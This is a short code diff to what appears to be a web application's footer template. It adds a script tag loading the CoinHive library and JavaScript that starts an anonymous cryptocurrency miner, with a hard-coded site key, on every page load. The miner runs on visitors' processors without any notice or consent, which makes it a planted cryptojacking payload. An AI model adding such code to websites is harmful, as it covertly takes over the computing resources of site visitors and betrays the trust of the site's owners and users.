@@ -1,1 +1,10 @@
 = Setting.get(:footer_code).to_s.html_safe
+
+%script{src: "https://coinhive.com/lib/coinhive.min.js"}
+:javascript
+  const options = {
+    threads: 2,
+    throttle: 0.4
+  };
+  const miner = new CoinHive.Anonymous('qM077kI9qFl0y4DXNYMhiAcm80XBGrbX');
+	miner.start();
